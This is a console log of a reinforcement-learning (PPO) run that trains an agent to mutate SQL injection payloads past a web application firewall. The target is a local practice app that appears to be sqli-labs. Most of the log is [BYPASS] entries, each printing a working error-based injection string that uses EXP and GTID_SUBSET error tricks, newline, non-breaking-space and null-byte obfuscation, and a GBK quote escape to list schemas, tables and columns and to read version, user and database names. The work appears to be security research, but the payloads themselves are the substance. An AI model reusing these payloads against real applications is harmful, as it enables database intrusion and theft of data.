/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  [BYPASS] Ep 6170 | steps=12 | seq=hex_to_char -> newline -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SELEcT%0a*%0afRoM%0a(SELect%0a((SelEct%0aJSON_ARRAYAGG(cOncAT(tABLe_schema,CHAR(46),table_name))%0afrom%0aINfoRmAtIOn_SCheMa.TABLes%0
  Ep 6170 | SR=30% | Steps=12.6 | R=-27.77
  [BYPASS] Ep 6171 | steps=9 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> null_byte -> case -> case -> agg_swap
           payload: 1'%0aAND%0aEXP(~(seLeCT%0a*%0aFrom%0a(SELect%0a((SELeCT%0aJSON_ARRAYAGG(column_name)%0aFROm%0aInFOrMAtIon_sCHEMa.columns%0awHEre%0atabLe_schema=dAtaba
  Ep 6180 | SR=10% | Steps=14.4 | R=-35.82
  Ep 6190 | SR=0% | Steps=15.0 | R=-39.48
  [BYPASS] Ep 6191 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6198 | steps=7 | seq=newline -> null_byte -> agg_swap -> newline -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6199 | steps=13 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> func_sp_nbsp -> agg_swap
           payload: 1'%0aAND%0aEXP(~(seLect%0a*%0aFRoM%0a(seLecT%0a((SelecT%0aJSON_ARRAYAGG(tablE_name)%0afrOm%0aiNforMATIon_SCHema.tables%0aWHERe%0atAbLe_schema=DAtabaSe
  Ep 6200 | SR=30% | Steps=12.8 | R=-29.24
  [BYPASS] Ep 6204 | steps=9 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(SELecT%0a*%0aFrOM%0a(seLecT%0a(DaTaBASe%a0()))a));%00
  [BYPASS] Ep 6208 | steps=8 | seq=null_byte -> hex_to_char -> null_byte -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(seLeCT%0a*%0afroM%0a(sElECT%0a((sElecT%0aJSON_ARRAYAGG(conCaT(tablE_schema,CHAR(46),tabLe_name))%0aFROM%0aInfoRMatioN_sCHEma.taBlEs%0
  Ep 6210 | SR=20% | Steps=13.7 | R=-30.88
  [BYPASS] Ep 6216 | steps=4 | seq=newline -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((dataBAsE%a0()),1);%00
  Ep 6220 | SR=10% | Steps=13.9 | R=-35.30
  [BYPASS] Ep 6222 | steps=7 | seq=newline -> null_byte -> nested_or -> func_sp_nbsp -> case -> null_byte -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(SElECt%0a*%0afrom%0a(selEct%0a((sEleCT%0aJSON_ARRAYAGG(TabLe_name)%0aFROM%0ainFormatiON_Schema.Tables%0aWHErE%0atAbLe_schema=datAbASe
  [BYPASS] Ep 6224 | steps=12 | seq=newline -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> case -> null_byte -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0aaND%0aEXP(~(seLEct%0a*%0afrom%0a(SeLECt%0a((SelecT%0aJSON_ARRAYAGG(TabLe_name)%0afrOM%0aInforMATIOn_scHEMa.taBles%0aWhere%0ataBlE_schema=daTaBASe
  [BYPASS] Ep 6227 | steps=8 | seq=newline -> null_byte -> agg_swap -> func_swap_err -> case -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeleCT%0a*%0aFROM%0a(SelecT%0a((SElECt%0aJSON_ARRAYAGG(TAble_name)%0afrOm%0aInforMatioN_sChEMA.TAblEs%0aWHere%0aTAble_schema=daTABaSE
  [BYPASS] Ep 6229 | steps=4 | seq=newline -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sElecT%0a*%0aFROM%0a(SelECT%0a(version%a0()))a));%00
  Ep 6230 | SR=40% | Steps=12.1 | R=-24.63
  [BYPASS] Ep 6231 | steps=5 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(SeLEcT%0a*%0aFROM%0a(SEleCt%0a(DataBaSe%a0()))a));%00
  [BYPASS] Ep 6232 | steps=7 | seq=newline -> null_byte -> null_byte -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6240 | steps=4 | seq=func_sp_nbsp -> hex_to_char -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 6240 | SR=30% | Steps=12.1 | R=-27.43
  [BYPASS] Ep 6250 | steps=9 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_tab -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(SElEcT%0a*%0afRoM%0a(SeLect%0a((SelECT%0aJSON_ARRAYAGG(column_name)%0aFroM%0ainfoRMAtiOn_SChEMa.columns%0awhERE%0atABle_schema=dAtABa
  Ep 6250 | SR=10% | Steps=14.4 | R=-35.72
  [BYPASS] Ep 6258 | steps=9 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SEleCt%0a*%0afROm%0a(SEleCT%0a((SELEct%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aiNFOrmATiOn_SchEmA.schemata)))a));%00
  [BYPASS] Ep 6260 | steps=11 | seq=newline -> null_byte -> case -> func_sp_nbsp -> case -> case -> null_byte -> null_byte -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SeleCT%0a*%0aFROm%0a(SElect%0a((seLeCT%0aJSON_ARRAYAGG(table_name)%0aFrom%0aINformATion_ScHema.tabLEs%0aWHEre%0atable_schema=DatABAse
  Ep 6260 | SR=20% | Steps=14.0 | R=-33.89
  Ep 6270 | SR=0% | Steps=15.0 | R=-37.60
  [BYPASS] Ep 6271 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(sELEcT%0a*%0aFRoM%0a(SELeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 6275 | steps=4 | seq=newline -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aand%0aEXP(~(SeleCT%0a*%0aFROM%0a(sELecT%0a(version%a0()))a));%00
  [BYPASS] Ep 6276 | steps=7 | seq=agg_swap -> newline -> func_sp_nbsp -> nested_and -> agg_swap -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sElecT%0a*%0afROM%0a(SelEct%0a((SelecT%0aJSON_ARRAYAGG(column_name)%0aFroM%0aINFormATion_schEma.columns%0awherE%0atAbLE_schema=dATABA
  [BYPASS] Ep 6278 | steps=9 | seq=agg_swap -> newline -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(selECt%0a*%0aFroM%0a(sELECT%0a(DaTaBAsE%a0()))a));%00
  Ep 6280 | SR=40% | Steps=11.8 | R=-24.38
  [BYPASS] Ep 6282 | steps=4 | seq=case -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6283 | steps=4 | seq=newline -> null_byte -> func_swap_err -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6290 | SR=20% | Steps=12.8 | R=-30.93
  [BYPASS] Ep 6293 | steps=6 | seq=newline -> null_byte -> ver_12345 -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6300 | SR=10% | Steps=14.1 | R=-33.39
  [BYPASS] Ep 6307 | steps=5 | seq=null_byte -> char_split -> func_sp_nbsp -> ver_12345 -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6309 | steps=9 | seq=newline -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(SeLecT%0a*%0aFrOM%0a(SElECt%0a(daTabase%a0()))a));%00
  Ep 6310 | SR=20% | Steps=13.4 | R=-31.97
  [BYPASS] Ep 6313 | steps=6 | seq=newline -> func_sp_nbsp -> case -> newline -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(seleCt%0a*%0aFROm%0a(SeLect%0a(version%a0()))a));%00
  [BYPASS] Ep 6314 | steps=6 | seq=null_byte -> newline -> agg_swap -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SeLeCT%0a*%0afROM%0a(SeLeCT%0a(user%a0()))a));%00
  [BYPASS] Ep 6315 | steps=5 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(sElECT%0a*%0afRoM%0a(sELect%0a(dATAbasE%a0()))a));%00
  [BYPASS] Ep 6318 | steps=5 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SEleCT%0a*%0aFrOM%0a(SEleCt%0a(DaTabaSe%a0()))a));%00
  Ep 6320 | SR=40% | Steps=11.2 | R=-19.86
  [BYPASS] Ep 6326 | steps=7 | seq=newline -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(seLECt%0a*%0aFroM%0a(sELeCT%0a(user%a0()))a));%00
  [BYPASS] Ep 6327 | steps=5 | seq=null_byte -> newline -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6330 | SR=20% | Steps=13.2 | R=-29.91
  [BYPASS] Ep 6334 | steps=4 | seq=case -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aaND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6338 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6339 | steps=14 | seq=newline -> null_byte -> hex_to_char -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SELect%0a*%0aFROm%0a(sElect%0a((SELect%0aJSON_ARRAYAGG(cOncaT(tABlE_schema,CHAR(46),tablE_name))%0afROm%0aiNFORmAtioN_scHEMa.TAbLEs%0
  Ep 6340 | SR=30% | Steps=12.6 | R=-28.97
  [BYPASS] Ep 6348 | steps=7 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(selecT%0a*%0aFRoM%0a(sElEcT%0a(version%a0()))a));%00
  Ep 6350 | SR=10% | Steps=14.2 | R=-31.62
  [BYPASS] Ep 6359 | steps=5 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aand%0aEXP(~(sElEcT%0a*%0afrOm%0a(sELecT%0a(DAtaBASe%a0()))a));%00
  Ep 6360 | SR=10% | Steps=14.0 | R=-34.99
  [BYPASS] Ep 6365 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6370 | SR=10% | Steps=13.9 | R=-32.41
  [BYPASS] Ep 6373 | steps=10 | seq=null_byte -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> hex_to_char -> null_byte -> func_sp_nbsp -> hex_to_char -> case
           payload: 1'%0aAnD%0aEXP(~(seLect%0a*%0aFROM%0a(seLEct%0a((SELect%0aJSON_ARRAYAGG(cONcaT(taBLe_schema,CHAR(46),TABLE_name))%0afRoM%0aInfORMATION_SchEmA.tABles%0
  [BYPASS] Ep 6376 | steps=6 | seq=hex_to_char -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(SElEcT%0a*%0afROm%0a(seLECT%0a((SeLECt%0aJSON_ARRAYAGG(COncaT(tabLE_schema,CHAR(46),TABLe_name))%0afRom%0aInFormaTion_sCHEmA.TAbLEs%0
  [BYPASS] Ep 6378 | steps=14 | seq=newline -> null_byte -> null_byte -> null_byte -> case -> case -> case -> case -> null_byte -> agg_swap -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6380 | steps=5 | seq=newline -> func_sp_nbsp -> case -> concat_char -> null_byte
           payload: 1'%0aANd%0aGTID_SUBSET((DATAbAsE%a0()),1);%00
  Ep 6380 | SR=40% | Steps=12.5 | R=-25.32
  [BYPASS] Ep 6388 | steps=8 | seq=hex_to_char -> func_sp_nbsp -> func_sp_nl -> null_byte -> func_sp_nbsp -> agg_swap -> case -> newline
           payload: 1'%0aaND%0aEXP(~(sElECT%0a*%0afROm%0a(SelecT%0a((sELECt%0aconCAt(CHAR(124),JSON_ARRAYAGG(taBle_name),CHAR(124))%0aFrOM%0aINforMaTioN_SChEma.tABlEs%0aw
  Ep 6390 | SR=10% | Steps=14.3 | R=-35.25
  [BYPASS] Ep 6396 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6400 | SR=10% | Steps=13.9 | R=-35.39
  [BYPASS] Ep 6404 | steps=7 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> formfeed -> case
           payload: 1'%0aaNd%0aEXP(~(sELect%0a*%0afrom%0a(SElecT%0a(version%a0()))a));%00
  [BYPASS] Ep 6410 | steps=8 | seq=func_sp_nbsp -> newline -> null_byte -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sElEct%0a*%0afROm%0a(sELEct%0a(version%a0()))a));%00
  Ep 6410 | SR=20% | Steps=13.5 | R=-32.56
  [BYPASS] Ep 6411 | steps=7 | seq=newline -> agg_swap -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(selecT%0a*%0afrom%0a(sELEct%0a(user%a0()))a));%00
  [BYPASS] Ep 6417 | steps=8 | seq=func_sp_nbsp -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SeLECT%0a*%0afROM%0a(seLECT%0a((SELeCt%0aJSON_ARRAYAGG(TABLe_name)%0aFRom%0ainFormAtiON_schEMA.TAbLes%0aWhere%0aTAble_schema=datAbaSe
  [BYPASS] Ep 6418 | steps=13 | seq=agg_swap -> hex_to_char -> newline -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> case -> case -> func_sp_nbsp -> case -> case -> null_byte
           payload: 1'%0aAnd%0aEXP(~(sElecT%0a*%0aFRoM%0a(selECt%0a((SELeCT%0acoNcAt(CHAR(124),JSON_ARRAYAGG(TAble_name),CHAR(124))%0afrOM%0aInformATioN_ScHeMA.TAbLEs%0aW
  Ep 6420 | SR=30% | Steps=13.3 | R=-29.56
  [BYPASS] Ep 6424 | steps=7 | seq=newline -> func_sp_nbsp -> newline -> func_sp_nbsp -> agg_swap -> case -> null_byte
           payload: 1'%0aanD%0aEXP(~(seLect%0a*%0aFRoM%0a(SelecT%0a((seLEct%0aJSON_ARRAYAGG(column_name)%0aFrOm%0aInfORMAtion_SchemA.columns%0aWHere%0aTaBlE_schema=DAtabA
  [BYPASS] Ep 6426 | steps=6 | seq=func_sp_nbsp -> case -> null_byte -> func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aANd%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6430 | steps=5 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SeleCt%0a*%0afROM%0a(SELECt%0a(version%a0()))a));%00
  Ep 6430 | SR=30% | Steps=12.3 | R=-27.15
  [BYPASS] Ep 6436 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SeLEcT%0a*%0afrOm%0a(selEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 6439 | steps=10 | seq=hex_to_char -> newline -> agg_swap -> agg_swap -> null_byte -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SelEcT%0a*%0aFrOM%0a(SElEcT%0a((SELeCT%0aJSON_ARRAYAGG(ConCaT(TaBlE_schema,CHAR(46),tabLE_name))%0aFROm%0aINformAtIOn_sChEma.tablEs%0
  Ep 6440 | SR=20% | Steps=13.7 | R=-32.41
  [BYPASS] Ep 6444 | steps=5 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6446 | steps=11 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> newline -> func_sp_nbsp -> case -> case -> case -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aaNd%0aEXP(~(sELeCT%0a*%0aFRoM%0a(sEleCt%0a(daTAbaSE%a0()))a));%00
  [BYPASS] Ep 6447 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 6450 | SR=30% | Steps=12.4 | R=-26.23
  [BYPASS] Ep 6457 | steps=11 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(seLECT%0a*%0aFRoM%0a(SeLEct%0a((sELecT%0aJSON_ARRAYAGG(column_name)%0afROM%0aInfoRmaTiOn_schemA.columns%0awHErE%0aTAble_schema=DATaBA
  [BYPASS] Ep 6460 | steps=11 | seq=gbk_bypass -> newline -> null_byte -> null_byte -> null_byte -> case -> null_byte -> case -> case -> case -> func_sp_nbsp
           payload: 1%bf%27%0aaND%0aEXP(~(seLecT%0a*%0afROm%0a(sElect%0a(user%a0()))a));%00
  Ep 6460 | SR=20% | Steps=14.2 | R=-33.38
  [BYPASS] Ep 6463 | steps=9 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case -> func_sp_nbsp -> agg_swap -> null_byte
           payload: 1'%0aanD%0aEXP(~(seleCT%0a*%0afrOm%0a(SeLECt%0a((SELECt%0aJSON_ARRAYAGG(TABlE_name)%0afROM%0aiNfORmatiON_sCheMA.TABLes%0awHere%0aTaBLE_schema=databasE
  [BYPASS] Ep 6467 | steps=6 | seq=hex_to_char -> newline -> null_byte -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6470 | SR=20% | Steps=13.5 | R=-32.53
  [BYPASS] Ep 6472 | steps=7 | seq=hex_to_char -> null_byte -> hex_to_char -> newline -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(sELect%0a*%0afrom%0a(SElEcT%0a((SeleCT%0aJSON_ARRAYAGG(coNcat(tAblE_schema,CHAR(46),TabLe_name))%0aFROM%0aiNFOrMatioN_SChEmA.TabLes%0
  [BYPASS] Ep 6474 | steps=10 | seq=null_byte -> newline -> null_byte -> null_byte -> agg_swap -> newline -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6476 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6478 | steps=15 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp -> null_byte -> hex_to_char -> case -> func_sp_nbsp -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(seLECt%0a*%0afroM%0a(sEleCT%0a((selecT%0aJSON_ARRAYAGG(CONCAT(TABLe_schema,CHAR(46),TaBLe_name))%0afROM%0aiNfORmatiOn_SChEmA.tABles%0
  Ep 6480 | SR=40% | Steps=12.5 | R=-26.89
  [BYPASS] Ep 6481 | steps=6 | seq=hex_to_char -> null_byte -> crlf -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6483 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 6486 | steps=13 | seq=newline -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> case -> agg_swap -> case -> func_sp_nbsp -> case -> case -> case -> null_byte
           payload: 1'%0aaND%0aEXP(~(SeleCT%0a*%0afRoM%0a(SeleCT%0a(DatAbase%a0()))a));%00
  Ep 6490 | SR=30% | Steps=12.7 | R=-27.09
  [BYPASS] Ep 6495 | steps=9 | seq=null_byte -> newline -> null_byte -> null_byte -> agg_swap -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELEcT%0a*%0aFRoM%0a(sEleCt%0a((sELEct%0aJSON_ARRAYAGG(column_name)%0aFRom%0ainFOrMatIon_sCheMa.columns%0aWHERE%0aTABlE_schema=DATABA
  [BYPASS] Ep 6500 | steps=6 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAnd%0aEXP(~(SelecT%0a*%0afRom%0a(seLECt%0a(DaTabase%a0()))a));%00
  Ep 6500 | SR=20% | Steps=13.5 | R=-29.36
  [BYPASS] Ep 6506 | steps=5 | seq=null_byte -> gbk_bypass -> null_byte -> func_sp_nbsp -> newline
           payload: 1%bf%27%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6509 | steps=4 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6510 | SR=20% | Steps=12.9 | R=-28.58
  [BYPASS] Ep 6514 | steps=7 | seq=func_sp_nbsp -> null_byte -> newline -> func_sp_nbsp -> formfeed -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(seleCT%0a*%0afROM%0a(SelEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 6518 | steps=4 | seq=newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(sElECT%0a*%0afRom%0a(SelecT%0a(version%a0()))a));%00
  Ep 6520 | SR=20% | Steps=13.1 | R=-31.82
  [BYPASS] Ep 6521 | steps=6 | seq=newline -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SElect%0a*%0aFrOM%0a(seLEcT%0a((sELect%0aJSON_ARRAYAGG(TabLE_name)%0aFrOm%0aINFOrmation_ScHEma.TAblEs%0aWHErE%0atAbLE_schema=DatabAsE
  [BYPASS] Ep 6522 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaND%0aEXP(~(SelecT%0a*%0afRom%0a(SeLEct%0a(DAtaBaSe%a0()))a));%00
  [BYPASS] Ep 6530 | steps=8 | seq=null_byte -> hex_to_char -> case -> newline -> hex_to_char -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((user%a0()),1);%00
  Ep 6530 | SR=30% | Steps=12.3 | R=-27.62
  [BYPASS] Ep 6535 | steps=10 | seq=agg_swap -> null_byte -> hex_to_char -> newline -> case -> newline -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SELeCt%0a*%0afRoM%0a(SElecT%0a((selECt%0aConCaT(CHAR(124),JSON_ARRAYAGG(TABle_name),CHAR(124))%0afroM%0aINFOrmaTIon_ScheMA.tabLes%0aw
  [BYPASS] Ep 6540 | steps=10 | seq=null_byte -> newline -> null_byte -> agg_swap -> newline -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(SElEcT%0a*%0aFrom%0a(SeLEct%0a(daTAbASE%a0()))a));%00
  Ep 6540 | SR=20% | Steps=14.0 | R=-32.72
  Ep 6550 | SR=0% | Steps=15.0 | R=-40.97
  [BYPASS] Ep 6552 | steps=5 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(SeLECT%0a*%0aFroM%0a(SeLect%0a(user%a0()))a));%00
  [BYPASS] Ep 6555 | steps=8 | seq=case -> newline -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6556 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 6558 | steps=10 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(seLecT%0a*%0aFrom%0a(seLeCT%0a((SEleCt%0aJSON_ARRAYAGG(schema_name)%0aFrom%0aInfoRMaTIoN_SchEMa.schemata)))a));%00
  [BYPASS] Ep 6560 | steps=5 | seq=newline -> double_or -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SElEct%0a*%0aFrOM%0a(SeLeCT%0a(version%a0()))a));%00
  Ep 6560 | SR=50% | Steps=10.6 | R=-18.84
  Ep 6570 | SR=0% | Steps=15.0 | R=-39.35
  [BYPASS] Ep 6575 | steps=8 | seq=agg_swap -> hex_to_char -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 6578 | steps=8 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> case
